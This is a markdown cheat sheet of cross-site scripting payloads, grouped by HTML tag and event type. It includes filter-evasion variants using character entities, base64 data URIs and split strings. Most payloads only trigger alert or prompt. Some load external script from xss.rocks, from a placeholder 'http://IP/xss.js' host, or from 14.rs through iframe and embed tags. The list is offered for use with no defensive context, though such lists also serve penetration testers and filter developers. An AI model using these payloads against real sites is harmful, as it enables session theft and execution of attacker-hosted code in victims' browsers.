# XSS Payloads
Just a bunch of XSS payloads.


### Refs
- https://github.com/s0md3v/AwesomeXSS
- https://xz.aliyun.com/t/1126


## SCRIPT
```
<script/a> alert(1) </script/a>
<SCRIPT/a SRC=http://xss.rocks/xss.js></SCRIPT/a>
<script>(alert)(1)</script>
<script>[1].find(top[/al/.source+/ert/.source])(1)</script>
<script>with(document)body.appendChild(createElement('script')).src/**/='http://IP/xss.js'</script>
<script>top[8680439..toString(30)](1)</script>
```

## IMG
```
<img src=1 onerror=alert(1)>
<img src=# onmouseover="alert(1)">
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

## SVG
```
<svg/onload=alert(1)>
<svg // onload = alert(1)>
<svg/onload=prompt(1)>
<svg/onload=top["alert"](1)>
<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1>
<svg/1='&q='onload=alert(1)>
```

## OTHERS
```
<iframe src=//14.rs>
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe//src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe/src = "javascript:alert(1)"><object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
<object data=javascript:alert(1)>
<form onsubmit=alert(1)><input type=submit>
<a href="" onmousedown="var name='&#39;;alert(1)//'; alert('smthg')">Link</a>
<input type="text" autofocus onfocus="console.log(1)>
<input autofocus onblur = "[1].find(alert)"> -->
<input autofocus onblur = "[1].find(top[/al/.source+/ert/.source])(1)">
<body onhashchange=alert(1)><a href=#x>click this!#x
<x onclick=alert(1)>click this!
<plaintext/onmouseover=prompt(1)>
<embed src=//14.rs>
```

## HTML 5 
```
<select autofocus onfocus=alert(1)>
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
```

## JS
```
')%0Atop["al"%2b"ert"]("XSS")//
```
